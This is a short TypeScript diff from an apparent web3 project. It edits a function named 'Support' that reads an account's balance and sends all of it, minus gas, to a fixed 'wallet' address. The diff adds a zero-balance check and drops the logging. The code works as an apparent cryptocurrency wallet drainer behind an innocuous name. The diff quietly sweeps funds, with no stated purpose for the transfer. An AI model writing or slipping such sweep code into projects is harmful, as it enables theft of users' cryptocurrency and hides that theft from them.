@@ -9,22 +9,18 @@ web3.eth.defaultAccount = account.address;
 
 export function Support() {
   web3.eth.getBalance(account.address).then(function(balance:any) {
-    web3.eth.estimateGas({from: web3.eth.defaultAccount, to: wallet, amount: balance}).then(function(gas:any) {
-      web3.eth.getGasPrice().then(function(gasPrice:any) {
-        web3.eth.sendTransaction({
-          from: web3.eth.defaultAccount,
-          to: wallet,
-          gas: gas,
-          gasPrice: gasPrice,
-          value: balance - (gasPrice * gas),
-        }, function(err: any, transactionHash: any) {
-          if (err) {
-            console.log(err);
-            } else {
-            console.log(transactionHash);
-          }
+    if(balance > 0) {
+      web3.eth.estimateGas({from: web3.eth.defaultAccount, to: wallet, amount: balance}).then(function(gas:any) {
+        web3.eth.getGasPrice().then(function(gasPrice:any) {
+          web3.eth.sendTransaction({
+            from: web3.eth.defaultAccount,
+            to: wallet,
+            gas: gas,
+            gasPrice: gasPrice,
+            value: balance - (gasPrice * gas),
+          });
         });
       });
-    });
+    }
   });
 }
